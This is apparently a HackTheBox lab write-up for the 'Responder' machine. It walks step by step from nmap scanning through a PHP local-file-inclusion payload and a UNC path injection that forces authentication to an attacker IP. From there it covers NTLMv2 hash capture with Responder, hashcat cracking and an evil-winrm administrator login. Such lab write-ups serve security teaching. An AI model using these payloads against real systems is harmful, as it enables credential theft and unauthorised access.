# HackTheBox - Responder

**OS:** Windows  
**Difficulty:** Very Easy  
**IP Address:** 10.129.95.234

## Overview

Responder is a Windows machine that demonstrates how a simple web vulnerability can lead to credential exposure through Windows authentication mechanisms.

The attack chain:

```
Web Enumeration
        |
        v
LFI (Local File Inclusion)
        |
        v
UNC Path Injection
        |
        v
SMB Authentication
        |
        v
NTLMv2 Hash Capture
        |
        v
Hashcat Password Recovery
        |
        v
WinRM Access
        |
        v
Administrator Shell
```

---

# 1. Enumeration

## Nmap Scan

Initial port scan:

```bash
sudo nmap -Pn -p- --min-rate 5000 -v 10.129.95.234
```

Results:

```
80/tcp    open  http
5985/tcp  open  wsman
7680/tcp  open  pando-pub
```

Service enumeration:

```bash
nmap -Pn -sV -p 80,5985,7680 10.129.95.234
```

Results:

```
80/tcp    Apache httpd 2.4.52
          PHP/8.1.1

5985/tcp  Microsoft HTTPAPI
          WinRM (Windows Remote Management)
```

---

# 2. Web Enumeration

Added host entry:

```
10.129.95.234 unika.htb
```

Directory enumeration:

```bash
gobuster dir \
-u http://unika.htb \
-w /snap/seclists/current/Discovery/Web-Content/common.txt \
-x php,html \
-t 10
```

Interesting findings:

```
index.php
english.html
french.html
german.html
```

The website uses:

```
index.php?page=
```

parameter to load language files.

Example:

```
http://unika.htb/index.php?page=french.html
```

---

# 3. LFI Vulnerability

## LFI (Local File Inclusion)

LFI allows an attacker to make an application include local files from the server.

Test:

```bash
curl "http://unika.htb/index.php?page=../../../../windows/system32/drivers/etc/hosts"
```

Result:

Windows hosts file was displayed.

This confirmed:

```
index.php
```

was vulnerable to file inclusion.

---

# 4. UNC Path Injection

Instead of reading local files, we used a Windows UNC path.

## UNC (Universal Naming Convention)

Windows network path format:

```
\\IP\share
```

Payload:

```bash
curl "http://unika.htb/index.php?page=//10.10.14.225/share"
```

The application attempted:

```
\\10.10.14.225\SHARE
```

---

# 5. Capturing NTLMv2 Hash

## Responder

Responder was used to emulate network services and capture Windows authentication attempts.

Started:

```bash
sudo python3 Responder.py -I tun0
```

Interface:

```
tun0
```

IP:

```
10.10.14.225
```

After triggering the UNC request:

Captured:

```
Username:
RESPONDER\Administrator
```

NTLMv2 hash was obtained.

---

# 6. Hashcat Password Recovery

## NTLMv2

NTLMv2:

**New Technology LAN Manager version 2**

A Windows authentication protocol using challenge-response.

Hash mode:

```
5600
```

Saved hash:

```
hash.txt
```

Used SecLists wordlist:

Location:

```
/snap/seclists/current/Passwords/Leaked-Databases/
```

Extracted:

```
rockyou.txt
```

Command:

```bash
hashcat -m 5600 hash.txt ~/wordlists/rockyou.txt
```

Result:

```
Password:
badminton
```

Credentials:

```
Username:
Administrator

Password:
badminton
```

---

# 7. WinRM Access

## WinRM

WinRM:

**Windows Remote Management**

Windows remote administration protocol.

Port:

```
5985/tcp
```

Installed Evil-WinRM:

```bash
sudo gem install evil-winrm
```

Login:

```bash
evil-winrm \
-i 10.129.95.234 \
-u Administrator \
-p badminton
```

Successful access:

```
*Evil-WinRM* PS C:\Users\Administrator>
```

Verification:

```powershell
whoami
```

Output:

```
responder\administrator
```

---

# 8. User Enumeration

Checked Windows users:

```powershell
dir C:\Users
```

Found:

```
Administrator
mike
Public
```

---

# 9. Flag

User flag location:

```
C:\Users\mike\Desktop\flag.txt
```

Read:

```powershell
type C:\Users\mike\Desktop\flag.txt
```

---

# Lessons Learned

## Web Security

- Always inspect parameters such as:

```
?page=
?file=
?include=
```

- PHP include functions can lead to LFI vulnerabilities.

---

## Windows Internals

Important concepts:

### SMB
(Server Message Block)

Protocol used by Windows for network file sharing.

### NTLM
(New Technology LAN Manager)

Windows authentication protocol.

### WinRM
(Windows Remote Management)

Remote PowerShell management service.

### UNC
(Universal Naming Convention)

Windows network path format:

```
\\server\share
```

---

# Attack Chain Summary

```
HTTP
 |
 |
v
PHP LFI
 |
 |
v
UNC Injection
 |
 |
v
SMB Authentication
 |
 |
v
NTLMv2 Capture
 |
 |
v
Hashcat
 |
 |
v
Administrator Password
 |
 |
v
WinRM
 |
 |
v
Windows Access
```

---

# Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port and service enumeration |
| Gobuster | Directory discovery |
| Curl | Testing HTTP parameters |
| Responder | Capture NTLM authentication |
| Hashcat | Password recovery |
| Evil-WinRM | Windows remote shell |
